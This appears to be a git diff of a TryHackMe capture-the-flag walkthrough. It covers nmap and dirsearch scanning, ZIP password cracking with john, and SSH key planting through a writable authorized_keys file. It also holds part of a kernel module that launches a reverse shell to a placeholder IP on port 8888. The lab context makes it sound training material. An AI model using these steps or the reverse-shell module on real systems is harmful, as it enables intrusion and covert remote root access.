@@ -1,18 +1,28 @@
+Hello guys, welcome to this THM avengers hub room !
 
+Before we start to help you :
+MyIp : 10.20.20.20
+TargetIp : 10.30.02.20
 
-we start by scanning the network with nmap -sV ip 
+we start by scanning the network with NMAP 
+
+```nmap -sV ip ```
 
 after scanning the network we can see there is SSH port (22) and http port (80) which the one interesting us,
 when we load to the main page we have a loading telling us that site is in maintnance so we need to find.
 
-Lets scan the differents paths : python3 dirsearch.py -u IP:PORT 
+Lets scan the differents paths, i use dirsearch but you can use gobuster or other tools !
+```python3 dirsearch.py -u http://10.30.02.20 ```
 
-we have diferent directorys, by navigating to it one by one we fond suspecious zip file that wa can download : 
+we have diferent directorys, by navigating to it one by one we fond suspecious zip file that we can download : 
 
 Lets try top open it ! 
 
-Oh it ask us for a password, hopefuly we can use some tools to try cracking the zip password like : 
+When we try to open the ZIP file, it asks for a password. Since we don’t know it, we can try to crack the password using zip2john and john
+```zip2john breakglass.zip > hash.txt```
 
+Then we use john with a popular wordlist (rockyou.txt) to try and crack the password:
+```john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt```
 
 Bingo, when we got the password we got this file,
 
@@ -38,8 +48,7 @@ executing commands like whoami, tell us we are www-data the webserver user,
 navigating to /home/ we found an user, listing his directory content we see a flag.txt BUT we cannot open it due to our permission, but something is interesting, we have full rights on the .ssh folder, navigating there we see .authorized_key a file storing the keys autorized to connect to the user via ssh without a password ! since we have the full rights on the file 
 we gonna go back on our machine and create an ssh key
 
-ssh-keygen -t rsa -b 4096 -f mykey
-![image](https://github.com/user-attachments/assets/1f034acc-53a9-4642-86d3-65b072c6d5b2)
+```ssh-keygen -t rsa -b 4096 -f mykey```
 
 
 open mykey.pub and copy all the content.
@@ -65,8 +74,8 @@ in the ssh host create the file cyberavengers.c and copy past your code, mine wa
 #include <linux/kthread.h>
 #include <linux/delay.h>
 
-#define REMOTE_IP "IP"   // Remplacez par votre IP
-#define REMOTE_PORT "8888"      // Remplacez par votre port
+#define REMOTE_IP "IP"   // Replace with your IP
+#define REMOTE_PORT "8888"      // Replace with your port
 
 static int reverse_shell_thread(void *data)
 {
@@ -82,7 +91,6 @@ static int reverse_shell_thread(void *data)
 static int __init rev_init(void)
 {
     printk(KERN_INFO "Reverse shell module loaded\n");
-    /* On démarre un thread qui exécutera le reverse shell */
     kthread_run(reverse_shell_thread, NULL, "rev_shell");
     return 0;
 }
@@ -101,6 +109,7 @@ MODULE_DESCRIPTION("Module kernel minimaliste pour reverse shell (à usage restr
 ```
 
 create Makefile to compile the c file : 
+```Makefile
 obj-m += cyberavengers.o
 
 all:
@@ -108,7 +117,7 @@ all:
 
 clean:
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
-
+```
 
 after that put another listener on our 8888 port : 
 
